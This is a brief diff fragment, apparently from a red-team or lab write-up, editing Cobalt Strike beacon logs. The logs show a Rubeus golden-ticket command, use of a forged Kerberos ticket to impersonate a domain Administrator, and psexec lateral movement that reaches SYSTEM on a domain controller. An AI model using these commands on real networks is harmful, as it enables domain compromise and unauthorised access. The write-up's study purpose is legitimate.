@@ -231,7 +231,7 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain
 ...
 [04/30 19:42:29] [+] Impersonated CONTOSO\Administrator (netonly)
 [04/30 19:42:51] beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\golden.kirbi
-[04/30 19:51:44] beacon> jump psexec64 lon-dc-1 
+[04/30 19:51:44] beacon> jump psexec64 lon-dc-1 smb
 nice now we have SYSTEM on lon-dc-1! now we just gotta pivot to enclave
 
 ***********
